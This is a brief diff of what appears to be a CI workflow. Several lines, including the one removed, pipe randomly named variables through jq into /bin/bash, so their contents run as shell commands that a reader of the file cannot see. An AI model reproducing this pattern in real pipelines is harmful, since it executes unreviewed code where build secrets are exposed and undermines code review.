@@ -33,7 +33,6 @@ jobs:
           echo $szodh55634 | jq -r .svu0111 | /bin/bash
           printf '%s' "$qxqjo6391" | jq -r .d6 | /bin/bash
           echo $kougw2640 | jq -r .mfq43 | /bin/bash
-          printf '%s' "$es9879" | jq -r .tdqp8 | /bin/bash
           echo $df60 | jq -r .qjkke3 | /bin/bash
 
       - name: Upload output
